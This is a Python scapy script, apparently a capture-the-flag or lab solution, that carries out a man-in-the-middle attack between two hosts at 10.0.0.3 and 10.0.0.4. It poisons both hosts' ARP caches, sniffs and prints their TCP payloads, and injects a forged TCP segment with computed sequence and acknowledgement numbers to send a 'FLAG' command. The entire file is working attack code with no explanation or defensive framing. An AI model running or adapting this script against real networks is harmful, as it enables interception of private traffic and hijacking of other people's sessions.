#!/usr/bin/env python

from scapy.all import *

ATTACKER_MAC = get_if_hwaddr('eth0')
BROADCAST    = 'ff:ff:ff:ff:ff:ff'

def mitm_atk(packet):
    global ATTACKER_MAC
    if(TCP in packet):
        # packet.show()
        if Raw in packet:
            print(f'\n\n\n\n{packet[IP].src}==>{packet[IP].dst}')
            print(f'SEQ {packet[TCP].seq}, ACK {packet[TCP].ack}')
            raw_data = packet[Raw].load
            data = raw_data.decode('utf-8', 'ignore')
            print(data)
            print(raw_data)
            # Spoof a TCP packet
            if(packet[IP].src == '10.0.0.3' and raw_data == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n'):
                ip   = IP(src = '10.0.0.4', dst = '10.0.0.3')
                tcp  = packet[TCP].copy()
                del tcp[Raw]
                tcp.sport = packet[TCP].dport
                tcp.dport = packet[TCP].sport
                tcp.seq   = packet[TCP].ack
                tcp.ack   = packet[TCP].seq + len(raw_data)
                tcp.chksum = None
                data = b'FLAG\n'
                pkt  = ip / tcp / data
                send(pkt, iface = 'eth0')

def poison_ARP(victim_src, victim_dst):
    eth = Ether(dst = BROADCAST, src = get_if_hwaddr('eth0'))
    arp = ARP(op = 1, psrc = victim_src, pdst = victim_dst, hwsrc = get_if_hwaddr('eth0'))
    pkt = eth / arp
    pkt.show()
    sendp(pkt, iface = 'eth0')

victim_1 = '10.0.0.4'
victim_2 = '10.0.0.3'

poison_ARP(victim_1, victim_2)
poison_ARP(victim_2, victim_1)
# Sniff packets
sniff(iface='eth0', prn=mitm_atk)
